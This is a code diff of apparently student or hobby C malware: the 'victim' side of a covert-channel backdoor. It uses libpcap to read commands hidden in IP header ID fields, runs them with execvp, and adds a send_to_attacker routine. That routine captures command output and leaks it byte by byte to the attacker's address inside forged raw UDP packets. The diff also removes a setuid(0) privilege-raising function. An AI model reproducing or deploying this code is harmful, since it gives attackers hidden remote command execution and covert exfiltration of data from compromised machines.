@@ -7,13 +7,12 @@ pid_t pid;
 int main(int argc, char *argv[]) {
     struct options_victim opts;
     char receive[256] = {0};
-    char received_instruction[64] = {0};
 
+    struct bpf_program fp;
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
     u_char* args = NULL;
     char* nic_interface;
     pcap_t* nic_fd;
-    struct bpf_program fp;
     bpf_u_int32 netp;
     bpf_u_int32 maskp;
 
@@ -29,9 +28,11 @@ int main(int argc, char *argv[]) {
     program_setup();
     options_victim_init(&opts);
     initialize_victim_server(&opts);
+
     nic_interface = pcap_lookupdev(errbuf);    // get interface
     pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
     nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
+    args = (u_char*)&opts;
     if (nic_fd == NULL) {
         printf("pcap_open_live(): %s\n", errbuf);
         exit(EXIT_FAILURE);
@@ -47,7 +48,6 @@ int main(int argc, char *argv[]) {
         fprintf(stderr,"Error setting filter\n");
         exit(1);
     }
-    args = (u_char*)&opts;
     pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
 
 
@@ -94,19 +94,11 @@ void options_victim_init(struct options_victim *opts) {
 }
 
 
-
-void program_setup(void) {
-    /* change the UID/GID to 0 (raise privilege) */
-    setuid(0);
-    setgid(0);
-}
-
-
 void initialize_victim_server(struct options_victim *opts) {
     struct sockaddr_in victim_address;
     int option = TRUE;
 
-    opts->victim_socket = socket(AF_INET, SOCK_DGRAM, 0);
+    opts->victim_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (opts->victim_socket == -1) {
         perror("socket() ERROR\n");
         exit(EXIT_FAILURE);
@@ -122,7 +114,7 @@ void initialize_victim_server(struct options_victim *opts) {
 
     option = 1;
     setsockopt(opts->victim_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
-
+    setsockopt(opts->victim_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
 
     if (bind(opts->victim_socket, (struct sockaddr *) &victim_address, sizeof(struct sockaddr_in)) == -1) {
         perror("bind() ERROR\n");
@@ -159,6 +151,7 @@ void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     struct ether_header* ether;
     struct iphdr *ip;
+    struct udphdr *udp;
     struct options_victim* ov;
     char temp[2] = {0};
     uint16_t c;
@@ -166,7 +159,15 @@ void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 
     ether = (struct ether_header*)(packet);
     ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
+    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
+
     c = hide_data(ntohs(ip->id));
+    ov->attacker_port = ntohs(udp->source);
+    if (ov->ip_flag == FALSE) {
+        convert_uint32t_ip_to_str(ip->daddr, ov->my_ip, 'v');
+        convert_uint32t_ip_to_str(ip->saddr, ov->attacker_ip, 'a');
+        ov->ip_flag = TRUE;
+    }
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     temp[0] = (char)c;
@@ -174,6 +175,23 @@ void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
     if (strstr(ov->received_buffer, "]]") != NULL) {
         extract_instruction(args);
         memset(ov->received_buffer, 0, S_ARR_SIZE);
+    }
+}
+
+
+void convert_uint32t_ip_to_str(uint32_t ip_addr, char* ip, char flag) {
+
+    if (flag == 'v') {
+        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
+            perror("inet_ntop error");
+            exit(EXIT_FAILURE);
+        }
+    }
+    if (flag == 'a') {
+        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
+            perror("inet_ntop error");
+            exit(EXIT_FAILURE);
+        }
     }
 }
 
@@ -207,20 +225,21 @@ void execute_instruction(u_char *args) {
 
     // TODO: PORT KNOCK
     commands = split_line(ov->instruction);
-    execute_command(commands);
+    execute_command(commands, args);
     free(commands);
+    send_to_attacker(args);
     memset(ov->instruction, 0, S_ARR_SIZE);
     // TODO: PORT KNOCK CLOSE
 }
 
 
 char **split_line(char *line) {
-    int bufsize = LSH_TOK_BUFSIZE, position = 0;
+    int bufsize = TOK_BUFSIZE, position = 0;
     char **tokens = malloc(bufsize * sizeof(char*));
     char *token;
 
     if (!tokens) {
-        fprintf(stderr, "lsh: allocation error\n");
+        fprintf(stderr, "maalloc error: split_line()\n");
         exit(EXIT_FAILURE);
     }
 
@@ -230,10 +249,10 @@ char **split_line(char *line) {
         position++;
 
         if (position >= bufsize) {
-            bufsize += LSH_TOK_BUFSIZE;
+            bufsize += TOK_BUFSIZE;
             tokens = realloc(tokens, bufsize * sizeof(char*));
             if (!tokens) {
-                fprintf(stderr, "lsh: allocation error\n");
+                fprintf(stderr, "realloc error: split_line()\n");
                 exit(EXIT_FAILURE);
             }
         }
@@ -245,7 +264,7 @@ char **split_line(char *line) {
 }
 
 
-int execute_command(char **command_arr) {
+int execute_command(char **command_arr, u_char *args) {
     int i;
 
     if (command_arr[0] == NULL) {
@@ -259,7 +278,7 @@ int execute_command(char **command_arr) {
         }
     }
 
-    return launch(command_arr);
+    return launch(command_arr, args);
 }
 
 
@@ -270,7 +289,7 @@ int num_builtins(void) {
 
 int builtin_cd(char **command_arr) {
     if (command_arr[1] == NULL) {
-        fprintf(stderr, "lsh: expected argument to \"cd\"\n");
+        fprintf(stderr, "expected argument to \"cd\"\n");
     } else {
         if (chdir(command_arr[1]) != 0) {
             perror("builtin_cd()");
@@ -285,26 +304,114 @@ int builtin_exit(char **command_arr) {
 }
 
 
-int launch(char **args) {
-    pid_t pid, wpid;
-    int status;
+int launch(char **command_arr, u_char *args) {
+    char output[OUTPUT_SIZE] = {0};
+    int bytes_read;
+    struct options_victim* ov;
+    int pipefd[2];
 
-    pid = fork();
-    if (pid == 0) {
-        // Child process
-        if (execvp(args[0], args) == -1) {
-            perror("launch()");
-        }
-        exit(EXIT_FAILURE);
-    } else if (pid < 0) {
-        // Error forking
-        perror("launch()");
-    } else {
-        // Parent process
-        do {
-            wpid = waitpid(pid, &status, WUNTRACED);
-        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
+    ov = (struct options_victim*)args;
+
+    if (pipe(pipefd) == -1) {
+        perror("pipe");
+        return 0;
     }
 
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Child process
+        close(pipefd[0]); // Close the read end of the pipe
+
+        // Redirect stdout to the write end of the pipe
+        if (dup2(pipefd[1], STDOUT_FILENO) == -1) {
+            perror("dup2");
+            exit(EXIT_FAILURE);
+        }
+        close(pipefd[1]);
+
+        if (execvp(command_arr[0], command_arr) == -1) {
+            perror("execvp");
+            exit(EXIT_FAILURE);
+        }
+    } else if (pid < 0) {
+        perror("fork");
+        return 0;
+    } else {
+        // Parent process
+        close(pipefd[1]); // Close the write end of the pipe
+
+        bytes_read = (int)read(pipefd[0], output, OUTPUT_SIZE);
+        if (bytes_read == -1) {
+            perror("read");
+            return 0;
+        }
+        output[bytes_read] = '\0'; // Null-terminate the output
+        strcpy(ov->sending_buffer, output);
+        close(pipefd[0]); // Close the read end of the pipe
+        // Wait for the child process to exit
+        wait(NULL);
+    }
     return 1;
+}
+
+
+void send_to_attacker(u_char *args) {
+    struct sockaddr_in attacker_address;
+    struct options_victim* ov;
+    struct iphdr ih;
+    struct udphdr uh;
+
+    uint16_t length;
+    char s_buffer[SEND_SIZE] = {0};
+    int byte;
+
+    ov = (struct options_victim*)args;
+    length = (uint16_t) strlen(ov->sending_buffer);
+
+    attacker_address.sin_family = AF_INET;
+    attacker_address.sin_port = htons(ov->attacker_port);
+    attacker_address.sin_addr.s_addr = inet_addr(ov->attacker_ip);
+
+    for (int j = 0; j < length; j++) {
+        create_udp_header(&uh, ov->attacker_port);
+        create_ip_header(&ih, ov->sending_buffer[j], args);
+        memcpy(s_buffer, &ih, sizeof(struct iphdr));
+        memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
+        byte = sendto(ov->victim_socket, (const char *) s_buffer, SEND_SIZE, 0,
+                      (const struct sockaddr *) &attacker_address, sizeof(attacker_address));
+        if (byte < 0) {
+            perror("send failed\n");
+        }
+        memset(s_buffer, 0, SEND_SIZE);
+    }
+}
+
+
+unsigned short create_udp_header(struct udphdr* uh, uint16_t port) {
+    uh->source = htons(DEFAULT_PORT);
+    uh->dest = htons(port);
+    uh->len = htons(sizeof(struct udphdr));
+    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));
+
+    return sizeof(struct udphdr);
+}
+
+
+unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args) {
+    struct options_victim* ov;
+    ov = (struct options_victim*)args;
+
+    ih->ihl = 5;
+    ih->version = 4;
+    ih->tos = 0;
+    ih->id = htons(hide_data((uint16_t)c));
+    ih->tot_len = htons(28);
+    ih->ttl = 64;
+    ih->frag_off = 0;
+    ih->protocol = IPPROTO_UDP;
+    ih->saddr = host_convert(ov->my_ip);
+    ih->daddr = host_convert(ov->attacker_ip);
+    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));
+
+    return sizeof(struct iphdr);
 }
